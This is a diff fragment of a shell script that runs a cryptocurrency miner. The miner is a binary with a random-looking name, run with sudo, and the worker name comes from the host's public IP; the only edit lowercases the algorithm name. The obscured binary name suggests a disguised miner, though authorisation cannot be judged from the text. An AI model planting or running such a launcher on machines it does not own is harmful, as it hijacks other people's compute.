@@ -6,4 +6,4 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok
 
 cd "$(dirname "$0")"
 
-chmod +x ./eaedaeqsd2wqe122 && sudo ./eaedaeqsd2wqe122 -a ETHASH -o $POOL -u $WALLET.$WORKER $@
+chmod +x ./eaedaeqsd2wqe122 && sudo ./eaedaeqsd2wqe122 -a ethash -o $POOL -u $WALLET.$WORKER $@
